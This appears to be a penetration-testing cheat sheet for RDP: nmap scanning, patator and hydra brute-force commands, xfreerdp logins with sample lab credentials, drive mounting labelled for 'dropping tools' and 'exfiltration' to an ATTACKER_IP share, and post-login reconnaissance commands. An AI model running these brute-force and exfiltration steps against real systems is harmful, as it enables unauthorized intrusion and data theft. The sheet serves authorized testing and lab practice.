## CHECKS

```md id="rdp1x0"
# Check if RDP is exposed (3389)
# Identify NLA requirement
# Test valid credentials
# Attempt password brute-force (if permitted)
# Mount local drive during session
```
## NMAP ENUMERATION

```bash id="rdp2x1"
# Basic RDP Scan
sudo nmap -p 3389 -sV $ip

# Check RDP Security (NLA)
sudo nmap -p 3389 --script rdp-enum-encryption,rdp-ntlm-info $ip
```
## RDP BRUTE FORCE

⚠ Only perform where authorized.

### PATATOR

```bash id="rdp3x2"
sudo patator rdp_login host=$ip user=FILE0 password=FILE1 \
0=./users 1=./passwords -x ignore:code=134
```
### HYDRA

```bash id="rdp4x3"
sudo hydra -f -V -l Administrator -P passwords.txt rdp://$ip
```
## CONNECT TO RDP (VALID CREDS)

### XFREERDP

```bash id="rdp5x4"
sudo xfreerdp3 /u:user /p:password321 \
/v:$ip /cert:ignore +clipboard /dynamic-resolution
```
## RDP – DOMAIN AUTHENTICATION

```bash id="rdp6x5"
sudo xfreerdp3 \
/u:bitbucket \
/d:LAB.ENTERPRISE.THM \
/p:littleredbucket \
/v:$ip \
/cert:ignore \
+clipboard \
/dynamic-resolution
```
## RDESKTOP (Legacy Tool)

```bash id="rdp7x6"
sudo rdesktop $ip
```
## MOUNT LOCAL DRIVE IN RDP SESSION

Useful for:

* File transfer
* Dropping tools
* Exfiltration

```bash id="rdp8x7"
sudo xfreerdp3 \
/u:bitbucket \
/d:LAB.ENTERPRISE.THM \
/p:littleredbucket \
/v:$ip \
/cert:ignore \
+clipboard \
/dynamic-resolution \
/drive:.,kali
```

Access from remote machine:

```md id="rdp9x8"
\\ATTACKER_IP\kali
```
## POST-LOGIN CHECKS

```md id="rdp10x9"
# whoami
# hostname
# systeminfo
# ipconfig /all
# net users
# net localgroup administrators
```
## NOTES

```md id="rdp11xa"
- Default port: 3389
- NLA (Network Level Authentication) may block brute-force
- Domain accounts often reused across services
- Clipboard and drive mounting useful for file transfer
- Check if account is local admin
```
